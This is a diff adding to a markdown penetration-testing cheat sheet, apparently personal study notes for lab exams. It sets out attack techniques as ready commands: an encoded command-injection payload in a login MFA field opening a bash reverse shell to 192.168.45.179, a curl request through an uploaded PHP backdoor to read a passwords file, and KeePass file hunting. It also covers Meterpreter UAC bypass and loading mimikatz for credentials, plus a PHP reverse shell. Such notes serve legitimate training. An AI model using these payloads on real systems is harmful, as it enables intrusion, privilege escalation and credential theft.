@@ -38,9 +38,17 @@
 ## Directory Traversal
 On Linux, we can use the /etc/passwd file to test directory traversal vulnerabilities. On Windows, we can use the file C:\Windows\System32\drivers\etc\hosts to test directory traversal vulnerabilities, which is readable by all local users. In Linux systems, a standard vector for directory traversal is to list the users of the system by displaying the contents of /etc/passwd. Check for private keys in their home directory, and use them to access the system via SSH.
 
-## XSS
+## Encoding Notes
+%20 = " " and %5C = "\"
+Note: Don't encode the "-" character in flags, and it looks like "/" characters also don't need to be encoded. 
+https://www.urlencoder.org/
+- EX: curl http://<URL>.com/<example>/uploads/backdoor.pHP?cmd=type%20..%5C..%5C..%5C..%5Cxampp%5Cpasswords.txt
+	- where backdoor is the cmd script in the RFI section below that has already been uploaded to the Windows machine so that we can read the passwords.txt file. <br>
+- When there is a username field, password field, and additional called MFA - From: "&&bash -c "bash -i >& /dev/tcp/192.168.45.179/7171 0>&1""
+- Becomes: username=user1&password=pass1&ffa=testmfa"%26%26bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.179%2F7171%200%3E%261%22"
+	- So make sure to enclose command in "&&\<encodedcommand>" (incl. quotes).
 
-## SQLi
+
 
 ## LFI
 - Executing a file on the server, though we may have to modify it first somehow.  
@@ -75,7 +83,9 @@ Firefox/91.0"
 	- Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
 	- curl"\<target>/index.php?page=http://\<kali server>/backdoor.php&cmd=ls"
 
+## XSS
 
+## SQLi
 
 # SQL
 ## mysql
@@ -121,6 +131,10 @@ Firefox/91.0"
 ## Enumeration
 ### cmd
 ### Powershell
+- Command for finding ".kdbx" files
+	- Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+- Download file from remote server
+	- iwr -uri http://\<server IP>/file.ext -outfile file.ext
 ### winpeas.exe
 ## Active Directory
 
@@ -215,6 +229,28 @@ scp -P \<ssh port> \<file to copy> user@\<destination IP>:\<destination folder>
 ## Crackmapexec
 ## Impacket
 ## Metasploit
+### Post Exploit 
+- idletime (meterpreter) - check that user's idletme
+- shell - switch to shell
+  - whoami /priv 
+- getuid - check user *from meterpreter*
+- getsystem - elevate privileges from meterpreter
+- ps 
+  - then migrate <PID> (check to see if other users are running it)
+  - execute -H -f notepad
+    - -H = hidden, -f = program
+- Check Integrity Level of current process:
+  - shell
+  - powershell -ep bypass
+  - Import-Module NtObjectManager
+  - Get-NtTokenIntegrityLevel 
+    - If that doesnt work then move on, if it does:
+      - search UAC - search for UAC bypass modules
+      - use exploit/windows/local/bypassuac_sdclt
+        - set SESSION \<x><br>
+- From meterpreter:
+  - load kiwi (loads mimikatz)
+  - help - shows all commands, including creds_msv
 
 ## Password Attacks
 ### Hydra
@@ -244,7 +280,7 @@ scp -P \<ssh port> \<file to copy> user@\<destination IP>:\<destination folder>
 4. hashcat -h | grep -i "ssh" (22921 for example)
 5. hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
 
-## Swaks
+## Swaks (Sending email from command line when you have creds for mail server)
 - swaks --to <recipient@email.com> --from <sender@email.com> -ap --attach @<attachment> --server \<mail server ip> --body "message" --header "Subject: Subject" --suppress-data
 	- You will need the password of the mail server user (likely the sender)
 	- Note that the mail server may not be the same machine as the user who opens the email
@@ -266,6 +302,7 @@ scp -P \<ssh port> \<file to copy> user@\<destination IP>:\<destination folder>
 	    
 	    exec("/bin/bash -c 'bash -i >& /dev/tcp/<kali_IP>/<kali_port> 0>&1'");
 	    ?>
+
 
 
 
